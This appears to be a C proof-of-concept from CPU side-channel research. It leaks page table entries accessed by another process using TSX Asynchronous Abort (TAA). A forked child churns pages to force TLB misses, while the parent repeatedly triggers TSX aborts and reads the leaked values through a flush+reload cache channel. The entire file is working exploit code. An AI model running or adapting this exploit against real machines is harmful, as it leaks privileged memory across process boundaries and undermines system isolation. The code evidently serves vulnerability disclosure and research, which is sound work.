/*
Leak page table entries accessed from another thread, using TAA.

Notes:
 * also possible without SMT

Expected output:

*/
#define ITERS 10000
#define NUM_PAGES 8192
#define END 8

#include "ridl.h"

int main(int argc, char *argv[]) {
	char *pgbuf = mmap(NULL, 4096 * NUM_PAGES, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);
	memset(pgbuf, 0x0, 4096 * NUM_PAGES);

	pid_t pid = fork();
	if (pid == 0) {
		// Churn through page table entries to get TLB misses.
		unsigned int n = 0;
		while (1) {
			n = (n + 1) & (NUM_PAGES - 1);
			asm volatile(
				"movb $0x42, 7(%0)\n"
				::"r"(pgbuf + (n * 4096)));
		}
	}
	if (pid < 0) return 1;

	ALLOC_BUFFERS();
	madvise(leak, 4096, MADV_DONTNEED);

	for (size_t offset = 0; offset < END; offset += 8) {
		printf("@%x:\n", (int)offset);
		memset(results, 0, sizeof(results));

		for (size_t i = 0; i < ITERS; ++i) {
			flush(reloadbuffer);
			tsxabort_leak_clflush_shifted(leak + offset, reloadbuffer, privatebuf, 0x0);
			reload(reloadbuffer, results);
		}

		print_results(results);
		printf("--\n");
	}

	kill(pid, SIGKILL);
}

